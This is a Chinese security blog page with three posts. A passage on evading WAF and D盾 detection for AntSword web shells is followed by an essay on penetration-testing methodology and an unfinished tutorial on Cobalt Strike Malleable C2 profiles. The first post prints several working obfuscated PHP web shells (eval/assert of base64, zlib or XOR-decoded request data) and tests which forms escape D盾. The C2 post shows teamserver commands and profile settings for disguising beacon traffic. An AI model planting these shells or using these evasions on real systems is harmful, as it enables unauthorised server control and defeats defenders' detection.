<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728160222681.png" alt="image-20200728160222681"></p>
<p>不过有老哥已经写了burp的分块传输的插件，我们可以将蚁剑的流量代理到burp上，再使用分块插件进行分块，嗯，真香。</p>
<p>蚁剑中设置：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728163023441.png" alt="image-20200728163023441"></p>
<p>burp插件中设置：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728163044919.png" alt="image-20200728163044919"></p>
<p>然后就可以分块了。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728163127083.png" alt="image-20200728163127083"></p>
<h5 id="方法三：各种编码解码器"><a href="#方法三：各种编码解码器" class="headerlink" title="方法三：各种编码解码器"></a>方法三：各种编码解码器</h5><p>蚁剑作者给了很多编解码器，地址：<a href="https://github.com/AntSwordProject/AwesomeEncoder" target="_blank" rel="noopener">https://github.com/AntSwordProject/AwesomeEncoder</a></p>
<p><strong>zlib</strong></p>
<p>在这个编码器里面也有关于如何去处理shell的提示</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728165427727.png" alt="image-20200728165427727"></p>
<p>我将之前测试免杀D盾的shell稍微改了一下就可以了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$c&#x3D;$_POST[&#39;ant&#39;];</span><br><span class="line">$d&#x3D;base64_decode($c);</span><br><span class="line">$e&#x3D;gzinflate($d);</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($e));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>最后效果如下:</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728165614745.png" alt="image-20200728165614745"></p>
<p><strong>动态密钥</strong></p>
<p>因为之前有人分析冰蝎的加密，得出可以通过获取密钥的那个数据包来对冰蝎的指纹进行识别，所以yzddmr6前辈为了写了两款关于动态密钥的编码器，一个是基于时间生成密钥的，还有一个是通过随机cookie来生成的，我们都学习一下吧。</p>
<p><strong>基于时间的动态密钥</strong></p>
<p>我们跟着代码稍微学习一下，下面这段代码是比较简单和，和蚁剑自带的编码器代码没有什么区别，主要的操作在xor函数里。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174216362.png" alt="image-20200728174216362"></p>
<p>跟进到xor函数里，函数里获取了当前的时间，并调用switch对时间的格式进行处理，switch这个函数是自定义的处理函数。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174601774.png" alt="image-20200728174601774"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174701365.png" alt="image-20200728174701365"></p>
<p>使用格式化后的time的md5值作为key,对payload进行异或处理。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174910075.png" alt="image-20200728174910075"></p>
<p>要使用这个编码器我们需要对我们的shell做一定的处理，需要在shell中加入解密的逻辑代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">date_default_timezone_set(&quot;PRC&quot;);</span><br><span class="line">@$post&#x3D;base64_decode($_REQUEST[&#39;yzddmr6&#39;]);</span><br><span class="line">$key&#x3D;md5(date(&quot;Y-m-d H:i&quot;,time()));</span><br><span class="line">for($i&#x3D;0;$i&lt;strlen($post);$i++)&#123;</span><br><span class="line">    $post[$i] &#x3D; $post[$i] ^ $key[$i%32];</span><br><span class="line">&#125;</span><br><span class="line">eval($post);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>最后数据包是这样的</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728175747960.png" alt="image-20200728175747960"></p>
<p>base64解码后也是看不到明文内容的</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728175815387.png" alt="image-20200728175815387"></p>
<p><strong>基于cookie的动态密钥</strong></p>
<p>这种方法生成26位的随机字符放在了cookie的PHPSESSID中，设置方法基于时间的差不多，最后效果如下：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728180915972.png" alt="image-20200728180915972"></p>
<p>这里yzddmr6前辈还给出了一个免杀的shell，我们分析下这个shell为什么就能免杀D盾</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Cookie</span><br><span class="line">&#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $key&#x3D;@$_COOKIE[&#39;PHPSESSID&#39;];</span><br><span class="line">        @$post&#x3D;base64_decode($_REQUEST[&#39;test&#39;]);</span><br><span class="line">        for($i&#x3D;0;$i&lt;strlen($post);$i++)&#123;</span><br><span class="line">            $post[$i] &#x3D; $post[$i] ^ $key[$i%26];</span><br><span class="line">        &#125;</span><br><span class="line">        return $post;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;return @eval($this-&gt;__construct());&#125;</span><br><span class="line">&#125;</span><br><span class="line">$check&#x3D;new Cookie();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我基本把代码都删完了，发现当仅仅留下下面这段代码的时候D盾是会爆1级的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;return @eval($this-&gt;__construct());&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728181601624.png" alt="image-20200728181601624"></p>
<p>然后前面加个函数名就不会杀了。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728181726799.png" alt="image-20200728181726799"></p>
<p>而且当直接调用eval($this)会升到4级，但是使用$this-&gt;__construct()这种形式就少了很多。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728181848146.png" alt="image-20200728181848146"></p>
<p>再测试了下，当参数中有-&gt;等级会下降很多，再加上参数+括号就不报了。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728182041283.png" alt="image-20200728182041283"></p>
<p><strong><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728182102746.png" alt="image-20200728182102746"></strong></p>
<p>所以对于其他敏感函数的拦截我们是不是也可以通过这种调用的方式绕过D盾的拦截。</p>
<p>我使用assert再进行了测试，直接这样绕是会爆一级的，但是在这个代码前加上其他函数就不杀了，所以我们又学到一个小技巧，就是可以把我们代码执行的函数放在其他函数的后面。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728182629591.png" alt="image-20200728182629591"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过对蚁剑免杀的学习，终于明白为什么我的shell总会被杀了，所以深入了解一个工具是非常有必要的。</p>
<p>参考文章：</p>
<p><a href="https://yzddmr6.tk/posts/antsword-xor-encoder-2/" target="_blank" rel="noopener">基于随机Cookie的蚁剑动态秘钥编码器</a></p>
<p><a href="https://yzddmr6.tk/posts/antsword-xor-encoder/" target="_blank" rel="noopener">蚁剑实现动态秘钥编码器解码器</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&mid=2247483852&idx=1&sn=3cd3f667523550d414fad97231eeeaea&chksm=e91c5a34de6bd3223f5c3e69aa12311be39d4c13ee8d222ddb81f97070c74698dc7ae7fcecba&mpshare=1&scene=23&srcid&sharer_sharetime=1572778022447&sharer_shareid=3bdf1b0c76d4c1691e700c57f87d9c0a%23rd" target="_blank" rel="noopener">蚁剑绕WAF进化图鉴</a></p>
<p><a href="https://xz.aliyun.com/t/4000#toc-4" target="_blank" rel="noopener">从静态到动态打造一款免杀的antSword(蚁剑)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/02/%E5%85%B3%E4%BA%8E%E6%B8%97%E9%80%8F%E7%BB%8F%E5%85%B8%E6%A1%88%E4%BE%8B%E7%9A%84%E6%80%9D%E8%80%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/02/%E5%85%B3%E4%BA%8E%E6%B8%97%E9%80%8F%E7%BB%8F%E5%85%B8%E6%A1%88%E4%BE%8B%E7%9A%84%E6%80%9D%E8%80%83/" class="post-title-link" itemprop="url">关于渗透经典案例的思考</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-09-02 19:53:35 / Modified: 20:05:02" itemprop="dateCreated datePublished" datetime="2020-09-02T19:53:35+08:00">2020-09-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9A%8F%E7%AC%94/" itemprop="url" rel="index">
                    <span itemprop="name">随笔</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">最近刚好要做一次分享，要用到自己以往的项目经历，但是我经过了仔细呢思索，翻了翻之前的项目笔记，</span><br><span class="line">发现竟然没有非常经典的渗透案例，也是非常的失望，工作这么久竟然连一点拿的出手的项目经历都没有。</span><br></pre></td></tr></table></figure>

<p>​       既然要谈谈经典的渗透案例，那先得说说什么样的渗透是经典的。第一点，不常规的思路。如果是通过非常常规的思路，比如注入，后台，上传，这个过程中如果非常的顺利，那这个项目就不是一个经典的案例，因为这个全是新手都知道的东西。第二点，稍微有些复杂的攻击链。<br>即使我们的思路非常不常规，如果在突破了某个点以后就结束了，这样好像也不是非常经典，所以如果是一个非常经典的经历，应该是有点历经波折这种感觉或者说绝处逢生也行。<br>        知道了什么是经典案例，再分析一下为什么我做了那么多项目却没有经典的。项目过于简单？应该是不存在的，因为后来我参与的很多项目都不算是简单的。那是项目太难了吗？是的吧，因为感觉很多项目都让人觉得没有希望，可是项目如果简单的话那也不会有经典的案例，所以项目是需要稍微难一点的，那为什么我做了那么多的难项目，却没有经典呢？我分析了一下，应该是项目的难度发生了变化，我的思路仍然没有变化，还是用之前的思路去渗透，这样的话我就不能攻克这样的系统，连打点都打不下，自然没有经典的案例产生了，这里又会有一个比较矛盾的问题，如果我用常规的思路攻克了，那么这个项目就不会是一个经典的项目，没攻克就更不会是了。所以这里的本质问题就出来了，因为总是使用常规的思路，这里的常规思路当然就是我之前渗透的经验。<br>​        那又有一个问题，我不用我以往的经验用什么，对啊，如果我不用自己以往的经验，我就要去学新东西，这个在项目中学习的成本也是非常高的，这个显然也是不现实的。所以这里又从一方面涉及到了日常技术积累的重要性。<br>​     我们肯定不是在任何项目的一开始就想去使用非常规的思路去做。什么项目适合用非常规的方法去做呢，肯定是我们用了常规思路做了以后没有结果，这个时候如果还固执的使用以往的经验继续做，可能最终比较难攻克，所以到这个时候就是想办法去找其他可能的思路的时候了，比如各种方式的钓鱼，社工，甚至物理渗透或者某种迂回的打法。这当然值得是一个小的点，还有很多其他需要我们去思考创新的一些手法，这个是一点，可以总结为新的思路的创新。<br>​    还有一点的话，我师傅会有一些比较经典的项目，结合他这个人的特点，他这个人渗透比较喜欢死磕，这个我也和他聊过，他认为有希望攻克的点就会死磕，所以第二个点的话就是找到自己认为有希望的点，然后想尽办法去死磕。<br>​    要使用这种方式，当然也是有前提的，第一点就是能找到一个认为有希望的点，他可能是一个挖掘出来但是非常难以利用的漏洞，或者说是需要某些组合利用才可以的才可以达到我们目的的点。有希望的说法可能不太好去理解，也可以说是有攻击成功的可能性，也就是这个攻击路径虽然复杂，不过我们只要找到了某种方式，最终会找到一个可达的攻击路径。我认为确认一个点是否可以磕，就是先抛开难度这种因素，分析这种攻击路径是否可达，可以实现我们的目的，如果可以，那么这个点就满足了可以磕的一个条件，当然，实际项目中还需要考虑时间成本的问题，从很多可以磕的点挑一个成本最低的一个点磕。<br>​      所以分析了这么多，<strong>希望自己能尽快有一些经典案例吧！</strong></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于Malleable C2的学习总结</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-09-02 10:27:15 / Modified: 20:03:48" itemprop="dateCreated datePublished" datetime="2020-09-02T10:27:15+08:00">2020-09-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
                    <span itemprop="name">cobaltstrike</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        通过之前我们对于CobaltStrike的Beacon通信流程分析，我们可以看到CobaltStrike在使用心跳包发送active和match，执行命令的返回结果通过请求submit.php来进行传输，而且我们通过这两个包发送和接收的也是一些加密的内容，因此可能有些杀软可能会对这样的请求进行拦截，如果这样，那么无论我们之前对shellcode怎么免杀，只要和服务端产生一些通信，那么都有可能被拦截，因此我们需要修改掉这些流量特征，好在CobaltStrike已经给我们提供了这样的功能，那就是malleable C2。</p>
<h3 id="关于malleable-C2基本介绍"><a href="#关于malleable-C2基本介绍" class="headerlink" title="关于malleable C2基本介绍"></a>关于malleable C2基本介绍</h3><p><strong>什么是malleable C2?</strong></p>
<p>​        Beacon的HTTP的indicators由Malleable-C2-profile文件控制，关于Malleable-C2-profile，它是一个简单的配置文件，用来指定如何转换数据并将其存储在transaction中，转换和存储数据的相同配置文件也从transaction中提取和恢复。 也就是说当Beacon使用HTTP进行通信时，可以通过Malleable-C2来控制如何接收和发送指令。</p>
<p><strong>为什么要使用malleable C2?</strong></p>
<p>​        因为我们使用默认beacon通信方式可以看到存在一些特征，所以我们需要通过需改Malleable-C2来更改流量的特征，让beacon和CoblatStrike服务端的通信流量尽量来模拟正常的访问通信，要实现这个功能，可以通过编写malleable-C2-profile来实现。</p>
<h3 id="malleable-C2-profile的编写分析"><a href="#malleable-C2-profile的编写分析" class="headerlink" title="malleable C2-profile的编写分析"></a>malleable C2-profile的编写分析</h3><p><strong>如何使用malleable C2-profile文件?</strong></p>
<p>​        我以网上公开的profile为例进行分析，<a href="https://github.com/xx0hcd/Malleable-C2-Profiles" target="_blank" rel="noopener">github地址</a>,下载后normal\msu_edu.profile来进行分析</p>
<p>​        当我们启动团队服务器时，可以使用如下命令来加载Malleable-C2-profile文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;teamserver [external IP] [password] [&#x2F;path&#x2F;to&#x2F;my.profile]</span><br></pre></td></tr></table></figure>

<p>​        将normal\msu_edu.profile上传到服务器，使用上面的命令可以加载，但是在加载之前首先要测试这个profile文件的内容格式是否有问题，可以通过c2lint命令来检测</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;c2lint xxxx.profile</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902170520452.png" alt="image-20200902170520452"></p>
<p>​        测试过程中+代表测试通过，%代表提醒的内容，！代表不通过的选项</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902170554118.png" alt="image-20200902170554118"></p>
<p>​        检查通过以后，我们通过下面的命令启动teamserver并且加载 malleable-C2-profile文件 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;teamserver  ip password msu_edu.profile</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902170742151.png" alt="image-20200902170742151"></p>
<p><strong>如何编写一个Malleable-C2-profile文件？</strong></p>
<p>​        打开后文件的开头如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">###Global Options###</span><br><span class="line">set sample_name &quot;msu_edu.profile&quot;;  &#x2F;&#x2F;通过set给变量sample_name进行赋值</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;37500&quot;;   &#x2F;&#x2F;设置睡眠时间为37秒左右</span><br><span class="line">set jitter    &quot;33&quot;;     &#x2F;&#x2F;设置抖动率，为了防止请求时间过于规律，在这里设置抖动率为33%</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 6.1) AppleWebKit&#x2F;587.38 (KHTML, like Gecko)   Chrome&#x2F;41.0.2228.0 Safari&#x2F;537.36&quot;;  &#x2F;&#x2F;设置user-agent</span><br><span class="line"></span><br><span class="line">#set host_stage &quot;false&quot;;  &#x2F;&#x2F;如果不需要分阶段传输payload，就可以在这里将host_stage的值设置为false</span><br><span class="line"></span><br><span class="line">###DNS options###</span><br><span class="line">set dns_idle &quot;8.8.8.8&quot;;   </span><br><span class="line">set maxdns    &quot;245&quot;;  &#x2F;&#x2F;通过dns传输数据时主机名的最大长度</span><br><span class="line">set dns_sleep &quot;0&quot;; &#x2F;&#x2F;在每个dns请求之间设置延时，这里没有延时</span><br><span class="line">set dns_stager_prepend &quot;&quot;; &#x2F;&#x2F;在dns payload之前插入内容</span><br><span class="line">set dns_stager_subhost &quot;&quot;; &#x2F;&#x2F;设置dns txt record stager的子域名</span><br><span class="line">set dns_max_txt &quot;252&quot;; &#x2F;&#x2F;设置dns txt返回最大长度</span><br><span class="line">set dns_ttl &quot;1&quot;; &#x2F;&#x2F;设置DNS响应的ttl的值</span><br><span class="line"></span><br><span class="line">###SMB options###</span><br><span class="line">set pipename &quot;ntsvcs&quot;;  &#x2F;&#x2F;在使用Smb beacon来进行通信时，设置命名管道的名字</span><br><span class="line">set pipename_stager &quot;scerpc&quot;;  &#x2F;&#x2F;设置stager使用的管道名</span><br><span class="line"></span><br><span class="line">###TCP options###</span><br><span class="line">set tcp_port &quot;8000&quot;;  &#x2F;&#x2F;设置tcp_beacon监听的端口，这里设置的是8000</span><br></pre></td></tr></table></figure>

<p>​        通过上面的配置，我们实现了以37秒为基准，百分之33左右的抖动率的功能，并且使用smb beacon时，默认的命名管道名字为ntsvcs</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902171550504.png" alt="image-20200902171550504"></p>
<p>​        当使用tcp beacon时，默认的端口是8000</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902171657470.png" alt="image-20200902171657470"></p>
<p>​        并且默认的user-agent将使用我们上面配置的.</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902172224238.png" alt="image-20200902172224238">    </p>
<p>​        我们继续分析，看看后面的配置文件,下面的配置文件主要用来配置证书和response header</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">###SSL Options### &#x2F;&#x2F;这个主要是给https beacon使用的配置</span><br><span class="line">#https-certificate &#123;</span><br><span class="line">    #set keystore &quot;your_store_file.store&quot;;  &#x2F;&#x2F;java kerstore文件</span><br><span class="line">    #set password &quot;your_store_pass&quot;; &#x2F;&#x2F;keystore文件的打开密码</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">#https-certificate &#123;  &#x2F;&#x2F;自签名的https证书配置</span><br><span class="line">#    set C &quot;US&quot;;   &#x2F;&#x2F;国家</span><br><span class="line">#    set CN &quot;whatever.com&quot;; &#x2F;&#x2F;域名</span><br><span class="line">#    set L &quot;California&quot;; &#x2F;&#x2F;地区</span><br><span class="line">#    set O &quot;whatever LLC.&quot;;  &#x2F;&#x2F;组织名</span><br><span class="line">#    set OU &quot;local.org&quot;; &#x2F;&#x2F;组织单位名称</span><br><span class="line">#    set ST &quot;CA&quot;; &#x2F;&#x2F;州或者省</span><br><span class="line">#   set validity &quot;365&quot;; &#x2F;&#x2F;时效</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">#code-signer &#123;  &#x2F;&#x2F;代码签名</span><br><span class="line">    #set keystore &quot;your_keystore.jks&quot;; &#x2F;&#x2F; java kerstore文件</span><br><span class="line">    #set password &quot;your_password&quot;;  &#x2F;&#x2F;keystore文件的打开密码</span><br><span class="line">    #set alias &quot;server&quot;;  &#x2F;&#x2F;</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">###HTTP-Config Block###  &#x2F;&#x2F;配置reponse header块</span><br><span class="line">http-config &#123;</span><br><span class="line">    #set headers &quot;Server, Content-Type&quot;;  </span><br><span class="line">    #header &quot;Content-Type&quot; &quot;text&#x2F;html;charset&#x3D;UTF-8&quot;;</span><br><span class="line">    #header &quot;Server&quot; &quot;nginx&quot;;</span><br><span class="line"></span><br><span class="line">    set trust_x_forwarded_for &quot;false&quot;;  &#x2F;&#x2F;如果teamserver使用了http重定向器，就需要选择true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        下面我们来配置GET请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">###HTTP-GET Block###</span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;siteindex&#x2F;a&#x2F; &#x2F;siteindex&#x2F;b&#x2F; &#x2F;siteindex&#x2F;c&#x2F;&quot;;  